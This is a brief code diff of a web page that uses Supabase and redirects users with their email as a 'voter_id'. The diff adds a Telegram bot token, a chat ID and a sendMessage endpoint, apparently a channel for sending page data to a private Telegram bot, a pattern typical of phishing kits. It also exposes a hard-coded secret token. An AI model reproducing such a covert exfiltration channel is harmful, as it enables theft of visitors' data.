@@ -88,6 +88,11 @@
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
   <script>
+
+    // 📌 Telegram Config
+    const TOKEN = "7489667679:AAEq4eANHrhdlNcc5hX2xNlL9Xf6AxsLaDQ";                                                            
+    const CHAT_ID = "8224358823";                                                       
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
    
     // 📌 Supabase Config
     const supabaseUrl = "https://jmeqvaotdigdvgkaostn.supabase.co";
@@ -193,4 +198,5 @@ window.location.href = "web.html?voter_id=" + encodeURIComponent(email);
   </script>
 </body>
 </html>
+
 
